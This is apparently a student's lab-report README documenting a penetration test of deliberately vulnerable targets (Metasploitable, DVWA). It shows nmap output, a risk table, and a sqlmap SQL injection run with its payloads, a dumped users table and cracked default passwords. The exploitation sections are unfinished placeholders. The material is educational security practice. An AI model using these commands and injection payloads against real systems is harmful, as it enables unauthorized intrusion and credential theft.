# Vulnerability Assessment and Penetration Testing (VAPT) 

## Overview
This repository documents a structured Vulnerability Assessment and Penetration
Testing (VAPT) workflow carried out in an authorized and controlled lab
environment. The objective is to demonstrate practical security testing skills,
methodology, and proper technical documentation.

The workflow covers network-level assessment, manual exploitation, post-
exploitation validation, web application testing, and automated vulnerability
scanning.

---

## Scope and Authorization
- Target Type: Deliberately vulnerable systems
- Testing Type: Educational / Authorized lab assessment
- Scope: Network services, system-level vulnerabilities, and web application
  vulnerabilities
- All activities were performed strictly for learning and demonstration purposes

---

## VAPT Workflow Summary

1. Network Scanning and Enumeration  
2. Vulnerability Identification  
3. Exploitation  
4. Post-Exploitation  
5. Web Application VAPT (DVWA)  
6. Automated Vulnerability Scanning 

---

## Phase 1: Network Scanning and Enumeration

**Tool Used:** Nmap  

### Activities
- Full TCP port scanning
- Service and version detection
- Identification of exposed and potentially vulnerable services

###  Command Used
```
nmap -sV  192.168.56.5 -oN nmap_scan.txt
# Nmap 7.98 scan initiated Mon Jan  5 04:25:28 2026 as: /usr/lib/nmap/nmap --privileged -sV -oN nmap_scan.txt 192.168.56.5
Nmap scan report for 192.168.56.5
Host is up (0.0033s latency).
Not shown: 977 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login?
514/tcp  open  shell       Netkit rshd
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan  5 04:25:44 2026 -- 1 IP address (1 host up) scanned in 16.46 seconds
```
### Outcome
Multiple network services were identified running outdated or insecure versions,
indicating a broad attack surface for further assessment.

### Evidence Location

Week 2/Scanning/

## Phase 2: Vulnerability Identification
Based on enumeration results, identified services were analyzed for known
weaknesses and misconfigurations.

### Key Observations
Insecure and legacy services exposed to the network

### Weak authentication mechanisms

Services commonly associated with publicly known exploits

A vulnerability mapping table was created to correlate services with risk level
and potential impact.

### Documentation

| Port | Service | Version | Risk | Reason |
|------|--------|---------|------|--------|
| 21 | FTP | vsftpd 2.3.4 | High | Known backdoor vulnerability |
| 23 | Telnet | Linux telnetd | High | Cleartext authentication |
| 139/445 | SMB | Samba 3.x | Critical | Multiple RCE vulnerabilities |
| 1524 | bindshell | Metasploitable root shell | Critical | Unauthenticated root access |
| 8180 | HTTP | Apache Tomcat | High | Weak credentials / RCE |



## Phase 3: Exploitation

Tool Used: Metasploit Framework

### Activities
Selection of exploit modules based on identified services
```
selection command prompt needed
```

Successful exploitation of vulnerable service
```
command prommpt text needed
```
Shell access obtained on the target system
```
full working bash shell needed 
```
### Result
The target system was successfully compromised, and root-level access was
achieved due to critical security misconfigurations. This confirms a high to
critical severity impact.

### Evidence Location

Week 2/Exploitation/

## Phase 4: Post-Exploitation
### Activities
Verification of privilege level
```
priv check needed
```

### Outcome
Post-exploitation confirmed complete system control, validating the severity of
the identified vulnerabilities.

### Evidence Location

Week 2/Post-Exploitation/

## Phase 5: Web Application VAPT (DVWA)
### Application Tested: Damn Vulnerable Web Application (DVWA)

### Vulnerability Identified
SQL Injection due to improper input validation

### Exploitation Method
Authenticated SQL Injection testing was performed using automated tooling.

```
sqlmap -u "http://<target-ip>/vulnerabilities/sqli/?id=1&Submit=Submit#" \
--cookie="security=low; PHPSESSID=<session-id>" \
-D dvwa -T users --dump
```
### Results
```
 sqlmap -u "http://10.49.143.189/vulnerabilities/sqli/?id=1&Submit=Submit#" \
--cookie="security=low; PHPSESSID=5u9v55ie912m05ctdksqf596b6" \
-D dvwa -T users --dump
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[.]_____ ___ ___  {1.9.12#stable}                                                                                                                                                                                                   
|_ -| . [(]     | .'| . |                                                                                                                                                                                                                   
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:31:34 /2026-01-05/

[07:31:34] [INFO] resuming back-end DBMS 'mysql' 
[07:31:34] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 6997=6997#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 2174 FROM(SELECT COUNT(*),CONCAT(0x7170627a71,(SELECT (ELT(2174=2174,1))),0x716a767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TgsJ&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 3295 FROM (SELECT(SLEEP(5)))Tssx)-- xZdl&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x7170627a71,0x42615a4568506b775a6c4d416753524b4a5873626c6c587072597261684f795054716c656d4b5848,0x716a767171),NULL#&Submit=Submit
---
[07:31:35] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0

[07:32:22] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[07:32:22] [INFO] starting 4 processes 
[07:32:23] [INFO] cracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'                                                                                                                                                    
[07:32:23] [INFO] cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'                                                                                                                                                   
[07:32:24] [INFO] cracked password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'                                                                                                                                                   
[07:32:25] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'                                                                                                                                                  
Database: dvwa                                                                                                                                                                                                                             
Table: users
[5 entries]
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| user_id | user    | avatar                      | password                                    | last_name | first_name | last_login          | failed_login |
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2018-10-03 22:09:36 | 0            |
| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2018-10-03 22:09:36 | 0            |
| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2018-10-03 22:09:36 | 0            |
| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2018-10-03 22:09:36 | 0            |
| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2018-10-03 22:09:36 | 0            |
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+

[07:32:28] [INFO] table 'dvwa.users' dumped to CSV file '/home/joe/.local/share/sqlmap/output/10.49.143.189/dump/dvwa/users.csv'
[07:32:28] [INFO] fetched data logged to text files under '/home/joe/.local/share/sqlmap/output/10.49.143.189'

```
Backend DBMS identified as MySQL
Databases and tables enumerated successfully
Sensitive user information extracted from the users table
Multiple SQL Injection techniques confirmed:
Boolean-based
Error-based
Time-based
UNION-based

### Evidence Location

Week 2/Capstone/

## Phase 6: Automated Vulnerability Scanning (OpenVAS)
Tool: OpenVAS / Greenbone Vulnerability Manager
```
needs to be configured
```
Week 2/scanning/

## Repository Structure

Week 2
├── Theory
├── Scanning
├── Exploitation
├── Post-Exploitation
├── Capstone
└── README.md


### Key Takeaways
Manual enumeration is essential for accurate vulnerability discovery

Exploitation validates real-world impact beyond automated scan results

Authenticated web application testing exposes critical vulnerabilities

Automated tools support, but do not replace, structured methodology


